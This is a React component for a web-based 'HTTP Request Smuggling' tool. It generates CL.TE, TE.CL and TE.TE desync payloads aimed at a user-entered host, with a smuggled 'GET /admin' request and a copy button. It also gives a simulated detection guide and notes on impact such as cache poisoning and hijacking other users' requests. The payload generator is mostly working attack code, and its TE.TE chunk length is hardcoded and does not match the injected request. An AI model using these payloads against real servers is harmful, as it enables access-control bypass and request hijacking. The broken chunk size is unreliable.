import { useState } from 'react';
import styles from './Tool.module.css';

type SmuggleType = 'CL.TE' | 'TE.CL' | 'TE.TE';

export default function HTTPSmuggling() {
  const [targetUrl, setTargetUrl] = useState('');
  const [smuggleType, setSmuggleType] = useState<SmuggleType>('CL.TE');
  const [smuggledRequest, setSmuggledRequest] = useState('');
  const [detectResult, setDetectResult] = useState('');

  const smugglePayloads: Record<SmuggleType, string> = {
    'CL.TE': `POST / HTTP/1.1
Host: vulnerable.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

G`,
    'TE.CL': `POST / HTTP/1.1
Host: vulnerable.example.com
Content-Length: 4
Transfer-Encoding: chunked

12
SMUGGLED_REQUEST
0

`,
    'TE.TE': `POST / HTTP/1.1
Host: vulnerable.example.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

5
AAAAA
0

`
  };

  const generatePayload = () => {
    const basePayload = smugglePayloads[smuggleType];
    const injectedPayload = `GET /admin HTTP/1.1
Host: vulnerable.example.com
X-Ignore: X`;

    let fullPayload = '';
    
    if (smuggleType === 'CL.TE') {
      fullPayload = `POST / HTTP/1.1
Host: ${targetUrl || 'vulnerable.example.com'}
Content-Length: 6
Transfer-Encoding: chunked

0

${injectedPayload}`;
    } else if (smuggleType === 'TE.CL') {
      const smuggled = `${injectedPayload}

`;
      const hexLen = smuggled.length.toString(16);
      fullPayload = `POST / HTTP/1.1
Host: ${targetUrl || 'vulnerable.example.com'}
Content-Length: 4
Transfer-Encoding: chunked

${hexLen}
${smuggled}0

`;
    } else {
      fullPayload = `POST / HTTP/1.1
Host: ${targetUrl || 'vulnerable.example.com'}
Transfer-Encoding: chunked
Transfer-encoding: identity

5e
${injectedPayload}
0

`;
    }

    setSmuggledRequest(fullPayload);
  };

  const detectVulnerability = () => {
    setDetectResult(`Detection Test for ${smuggleType} Desync

Testing methodology:
1. Send a request with both Content-Length and Transfer-Encoding headers
2. Monitor response timing for delays (indicates request queue poisoning)
3. Send subsequent requests to check for response desynchronization
4. Look for unexpected responses (e.g., accessing admin pages)

Vulnerability Indicators:
- Response delays (3-5 seconds)
- 404 errors on valid endpoints after smuggled request
- Cached responses containing smuggled request data
- Status code mismatches between expected and actual responses

⚠️ This is a simulation. Real detection requires sending actual HTTP requests and analyzing server behavior.

Next Steps:
1. Use Burp Suite Collaborator to detect backend processing
2. Try different header variations (space, tab, newline)
3. Test with timing attacks (sending requests rapidly)
4. Check for routing discrepancies in load balancers`);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(smuggledRequest);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.toolHeader}>
        <div className={styles.toolTitle}>
          <span className={styles.toolIcon}>🔀</span>
          HTTP Request Smuggling
        </div>
        <div className={styles.toolSubtitle}>
          Test for HTTP desynchronization vulnerabilities (CL.TE, TE.CL, TE.TE)
        </div>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.inputGroup}>
          <label>Target Host</label>
          <input
            type="text"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="vulnerable.example.com"
          />
        </div>

        <div className={styles.inputGroup}>
          <label>Smuggling Technique</label>
          <select value={smuggleType} onChange={(e) => setSmuggleType(e.target.value as SmuggleType)}>
            <option value="CL.TE">CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)</option>
            <option value="TE.CL">TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)</option>
            <option value="TE.TE">TE.TE (Obfuscated Transfer-Encoding)</option>
          </select>
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={generatePayload}>
            Generate Payload
          </button>
          <button className={styles.secondaryBtn} onClick={detectVulnerability}>
            Detection Guide
          </button>
        </div>

        {smuggledRequest && (
          <div className={styles.outputSection}>
            <div className={styles.outputHeader}>
              <label>Smuggling Payload</label>
              <button className={styles.copyBtn} onClick={copyToClipboard}>
                Copy
              </button>
            </div>
            <div className={styles.output} style={{ whiteSpace: 'pre' }}>{smuggledRequest}</div>
          </div>
        )}

        {detectResult && (
          <div className={styles.outputSection}>
            <label>Detection Guide</label>
            <div className={styles.output} style={{ whiteSpace: 'pre-wrap' }}>{detectResult}</div>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>HTTP Request Smuggling</h3>
          <p>Exploits discrepancies in how front-end and back-end servers parse HTTP requests.</p>
          
          <h4>CL.TE Attack:</h4>
          <ul>
            <li>Front-end uses Content-Length, back-end uses Transfer-Encoding</li>
            <li>Smuggle requests by manipulating Content-Length to be shorter than actual body</li>
            <li>Remaining bytes are treated as the start of the next request by back-end</li>
          </ul>

          <h4>TE.CL Attack:</h4>
          <ul>
            <li>Front-end uses Transfer-Encoding, back-end uses Content-Length</li>
            <li>Send chunked request with incorrect Content-Length</li>
            <li>Back-end reads up to Content-Length, leaving smuggled request in buffer</li>
          </ul>

          <h4>TE.TE Attack:</h4>
          <ul>
            <li>Both servers support Transfer-Encoding but can be tricked</li>
            <li>Obfuscate header: "Transfer-Encoding: chunked" vs "Transfer-encoding: identity"</li>
            <li>Exploit case sensitivity or whitespace handling differences</li>
          </ul>

          <h3>Impact</h3>
          <ul>
            <li>Bypass security controls and access restrictions</li>
            <li>Poison web cache with malicious content</li>
            <li>Hijack other users' requests</li>
            <li>Perform request routing attacks</li>
          </ul>

          <p className={styles.warning}>
            ⚠️ HTTP request smuggling is a critical vulnerability. Only test on systems you own. Requires manual HTTP request crafting with tools like Burp Suite.
          </p>
        </div>
      </div>
    </div>
  );
}
